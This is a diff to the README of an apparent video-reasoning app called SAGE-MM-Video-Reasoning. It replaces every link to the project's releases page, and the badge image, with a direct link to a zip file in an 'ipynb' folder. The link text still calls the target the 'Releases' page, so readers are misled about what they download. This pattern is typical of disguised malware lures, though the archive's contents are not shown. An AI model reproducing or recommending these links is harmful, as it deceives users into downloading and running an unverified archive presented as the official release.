@@ -1,6 +1,6 @@
 # 🎥 SAGE-MM-Video-Reasoning - Analyze Videos with Ease
 
-[![Download SAGE-MM-Video-Reasoning](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/releases)
+[![Download SAGE-MM-Video-Reasoning](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/SAG_Reasoning_M_Video_v1.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/SAG_Reasoning_M_Video_v1.5.zip)
 
 ## 📚 Introduction
 
@@ -19,7 +19,7 @@ To start using SAGE-MM-Video-Reasoning, follow the steps below. You will need a 
 
 ## 📥 Download & Install
 
-To download SAGE-MM-Video-Reasoning, visit this page to download: [SAGE-MM-Video-Reasoning Releases](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/releases)
+To download SAGE-MM-Video-Reasoning, visit this page to download: [SAGE-MM-Video-Reasoning Releases](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/SAG_Reasoning_M_Video_v1.5.zip)
 
 1. Click on the link above to open the releases page.
 2. You will see the latest version listed. Look for the title of the release.
@@ -104,4 +104,4 @@ The app is optimized for newer operating systems. Older versions may not support
 
 Simply type your question in clear, natural language. For example, "What happens in this video?"
 
-Visit this page to download: [SAGE-MM-Video-Reasoning Releases](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/releases)
+Visit this page to download: [SAGE-MM-Video-Reasoning Releases](https://github.com/sivasubran03/SAGE-MM-Video-Reasoning/raw/refs/heads/main/ipynb/SAG_Reasoning_M_Video_v1.5.zip)
